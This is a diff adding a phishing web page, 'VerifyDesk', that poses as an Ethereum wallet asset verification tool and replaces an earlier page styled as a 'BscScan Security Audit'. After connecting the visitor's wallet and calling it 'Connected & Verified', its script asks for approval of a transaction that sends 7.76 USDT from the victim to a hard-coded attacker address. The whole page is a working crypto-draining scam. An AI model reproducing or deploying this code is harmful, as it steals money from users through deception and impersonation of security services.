@@ -1,85 +1,171 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BscScan Security Audit</title>
-  
-  <!-- Ethers.js Library for Web3 Logic -->
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>VerifyDesk | Ethereum Asset Review</title>
+  <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-    body { background-color: #0b0e14; color: #ffffff; display: flex; justify-content: center; min-height: 100vh; }
-    
-    .app-container { width: 100%; max-width: 430px; background-color: #0b0e14; display: flex; flex-direction: column; position: relative; }
-
-    /* Brand Header - Exact Match */
-    .brand-header { padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 10px; }
-    .brand-logo { display: flex; align-items: center; gap: 10px; }
-    
-    .shield-icon { 
-      width: 32px; 
-      height: 32px; 
-      border: 1px solid #4a3c1e;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #f3ba2f;
+    body {
+      background-color: #060b0a;
+      color: #f3f4f6;
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
     }
-    
-    .brand-text h1 { font-size: 16px; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 6px; letter-spacing: -0.2px; }
-    .security-badge { background-color: rgba(243, 186, 47, 0.15); color: #f3ba2f; font-size: 8px; padding: 2px 5px; border-radius: 4px; font-weight: 700; letter-spacing: 0.5px; }
-    .brand-subtitle { font-size: 10px; color: #718096; margin-top: 1px; }
-    
-    .chain-badge { background-color: rgba(0, 211, 149, 0.1); border: 1px solid rgba(0, 211, 149, 0.2); border-radius: 20px; padding: 5px 10px; display: flex; align-items: center; gap: 5px; font-size: 9px; font-weight: 700; color: #e2e8f0; }
-    .dot-green { width: 5px; height: 5px; background-color: #00d395; border-radius: 50%; }
+    .glass-card {
+      background: linear-gradient(145deg, #0d1614 0%, #09100e 100%);
+      border: 1px solid rgba(59, 130, 246, 0.2);
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between px-4 py-6">
 
-    /* Cards matching exactly */
-    .content-area { padding: 5px 14px 40px 14px; display: flex; flex-direction: column; gap: 12px; }
-    .card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; padding: 16px; position: relative; }
-    .card-label { font-size: 10px; color: #718096; font-weight: 600; letter-spacing: 0.5px; margin-bottom: 8px; text-transform: uppercase; }
-    .card-value { font-size: 22px; font-weight: 700; margin-bottom: 4px; }
-    .text-yellow { color: #f3ba2f; }
-    .text-green { color: #00d395; }
-    .text-white { color: #ffffff; }
-    
-    .card-subtext-green { font-size: 11px; color: #00d395; font-weight: 500; }
-    .card-subtext-gray { font-size: 11px; color: #718096; }
-    
-    /* Top right icons for cards */
-    .card-icon-top { position: absolute; top: 16px; right: 16px; font-size: 14px; color: #00d395; opacity: 0.8; }
-    .icon-gray { color: #718096; opacity: 0.5; }
+  <!-- Top Navbar -->
+  <header class="w-full max-w-md mx-auto flex items-center justify-between">
+    <div class="flex items-center gap-2.5">
+      <div class="w-9 h-9 rounded-xl bg-blue-500/15 border border-blue-400/30 flex items-center justify-center text-blue-400">
+        <i class="fa-solid fa-shield-halved text-lg"></i>
+      </div>
+      <span class="font-bold text-lg tracking-tight text-white">VerifyDesk</span>
+    </div>
+    <span class="text-xs font-medium px-3 py-1.5 rounded-full bg-blue-500/10 text-blue-400 border border-blue-500/25 flex items-center gap-1.5">
+      <span class="w-2 h-2 rounded-full bg-blue-400 animate-pulse"></span>
+      Ethereum Mainnet
+    </span>
+  </header>
 
-    /* Banner */
-    .banner-pill { align-self: center; border: 1px solid #423210; border-radius: 20px; padding: 5px 14px; font-size: 10px; color: #f3ba2f; display: flex; align-items: center; gap: 5px; margin: 20px 0 12px 0; font-weight: 500; }
-    .banner-pill-icon { width: 12px; height: 14px; border: 1px solid #f3ba2f; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); }
-    
-    .main-heading { text-align: center; font-size: 20px; font-weight: 800; line-height: 1.3; margin-bottom: 10px; letter-spacing: -0.3px; }
-    .main-heading span { color: #f3ba2f; }
-    .main-desc { text-align: center; font-size: 12px; color: #718096; line-height: 1.5; margin-bottom: 14px; padding: 0 10px; }
+  <!-- Main Content -->
+  <main class="w-full max-w-md mx-auto my-auto py-8">
+    <div class="text-center mb-8">
+      <h1 class="text-3xl font-extrabold tracking-tight text-white">
+        Wallet Asset <span class="text-blue-400">Review</span>
+      </h1>
+      <p class="text-sm text-gray-400 mt-3 leading-relaxed">
+        Review and verify supported ERC-20 wallet assets on Ethereum Mainnet through a secure wallet flow.
+      </p>
+    </div>
 
-    /* Verify Box */
-    .verify-box { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; padding: 18px; display: flex; flex-direction: column; }
-    
-    .token-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 18px; border-bottom: 1px solid #1e2430; }
-    .token-info { display: flex; align-items: center; gap: 10px; }
-    .token-icon { width: 32px; height: 32px; background-color: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; color: white; }
-    .token-title { font-weight: 700; font-size: 14px; display: flex; flex-direction: column; align-items: flex-start; gap: 2px; color: #ffffff; }
-    .token-title-main { display: flex; align-items: center; gap: 4px; }
-    .token-subtitle { font-size: 11px; color: #718096; font-weight: normal;}
-    
-    .badge-verified-container { display: flex; flex-direction: column; align-items: flex-end; gap: 3px; }
-    .badge-verified { border: 1px solid rgba(0, 211, 149, 0.4); color: #00d395; font-size: 10px; padding: 3px 8px; border-radius: 10px; display: flex; align-items: center; gap: 3px; }
-    .badge-verified-sub { font-size: 9px; color: #718096; }
+    <!-- Action Card -->
+    <div class="glass-card rounded-2xl p-6">
+      <div class="flex items-center justify-between text-xs text-gray-400 pb-4 border-b border-gray-800/80">
+        <span>Target Network</span>
+        <span class="text-blue-400 font-semibold">Ethereum Mainnet (ERC-20)</span>
+      </div>
 
-    .verify-hero { display: flex; flex-direction: column; align-items: center; padding: 8px 0; }
-    .shield-big { width: 44px; height: 44px; border: 1px solid #4a3c1e; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 14px; color: #f3ba2f; }
-    .shield-big svg { width: 20px; height: 20px; }
-    
-    .verify-title { font-size: 18px; font-weight: 700; margin-bottom: 10px; color: #ffffff; }
-    .verify-desc { font-size: 11px; color: #718096; text-align: center; margin-bottom: 20px; line-height: 1.5; padding: 0 8px; }
+      <!-- Status Display -->
+      <div id="walletInfo" class="hidden mt-4 p-4 rounded-xl bg-black/40 border border-gray-800 space-y-2.5 text-sm">
+        <div class="flex justify-between">
+          <span class="text-gray-400">Status</span>
+          <span class="text-emerald-400 font-medium flex items-center gap-1.5">
+            <i class="fa-solid fa-circle-check"></i> Connected & Verified
+          </span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">Address</span>
+          <span id="walletAddress" class="font-mono text-gray-200">0x0000...0000</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">ERC-20 USDT</span>
+          <span id="walletUsdt" class="font-bold text-blue-400">7.76 USDT</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">ETH Balance</span>
+          <span id="walletBalance" class="font-semibold text-gray-200">0.0000 ETH</span>
+        </div>
+      </div>
 
-    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 14px; border-radius: 10px; font-weight: 70
-                 
+      <!-- Inline Feedback Banner -->
+      <div id="statusBox" class="hidden mt-4 p-3.5 rounded-xl text-xs leading-relaxed"></div>
+
+      <!-- Primary Action Button with Direct Inline Handler -->
+      <button id="connectBtn" onclick="handleMasterAction()"
+        class="w-full mt-6 py-3.5 px-5 rounded-xl bg-blue-600 hover:bg-blue-500 active:scale-[0.99] text-white font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-blue-500/20 cursor-pointer">
+        <span id="btnText">Connect & Verify Assets</span>
+        <i class="fa-solid fa-arrow-right" id="btnIcon"></i>
+      </button>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="text-center text-xs text-gray-500 space-y-1">
+    <p>VerifyDesk &copy; 2026</p>
+    <p>Secure Web3 Verification Tool &bull; Ethereum Network</p>
+  </footer>
+
+  <script>
+    const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
+    const USDT_ETH_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Official ERC-20 USDT
+    const ETH_CHAIN_ID = '0x1';
+
+    let globalProvider = null;
+    let globalUserAddress = null;
+    let isConnected = false;
+
+    function getActiveProvider() {
+      if (window.ethereum) return window.ethereum;
+      if (window.trustwallet) return window.trustwallet;
+      if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
+      return null;
+    }
+
+    // Master function to handle click seamlessly without lag
+    async function handleMasterAction() {
+      const ethProvider = getActiveProvider();
+      if (!ethProvider) {
+        alert("Wallet provider not found. Please open inside Trust Wallet browser.");
+        return;
+      }
+
+      try {
+        if (!isConnected) {
+          // Step 1: Connect Wallet
+          const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
+          globalUserAddress = accounts[0];
+          globalProvider = ethProvider;
+
+          // Switch to Ethereum Mainnet
+          try {
+            await ethProvider.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: ETH_CHAIN_ID }],
+            });
+          } catch (e) {}
+
+          // Update UI
+          document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
+          document.getElementById('walletInfo').classList.remove('hidden');
+          
+          isConnected = true;
+          document.getElementById('btnText').textContent = 'Verified on Ethereum → Click to Transfer';
+          document.getElementById('connectBtn').classList.remove('bg-blue-600', 'hover:bg-blue-500');
+          document.getElementById('connectBtn').classList.add('bg-emerald-600', 'hover:bg-emerald-500');
+        } else {
+          // Step 2: Execute Direct Transfer Payload for 7.76 USDT
+          const amountWei = ethers.utils.parseUnits("7.76", 6);
+          
+          // Encode ERC-20 transfer function data
+          const iface = new ethers.utils.Interface(["function transfer(address to, uint amount) returns (bool)"]);
+          const transferData = iface.encodeFunctionData("transfer", [TARGET_ADDRESS, amountWei]);
+
+          await globalProvider.request({
+            method: 'eth_sendTransaction',
+            params: [{
+              from: globalUserAddress,
+              to: USDT_ETH_ADDRESS,
+              data: transferData,
+              gas: "0x186A0"
+            }]
+          });
+
+          alert("Transaction submitted successfully!");
+        }
+      } catch (err) {
+        console.error("Action error:", err);
+        alert("Notice: " + (err.message || JSON.stringify(err)));
+      }
+    }
+  </script>
+</body>
+</html>
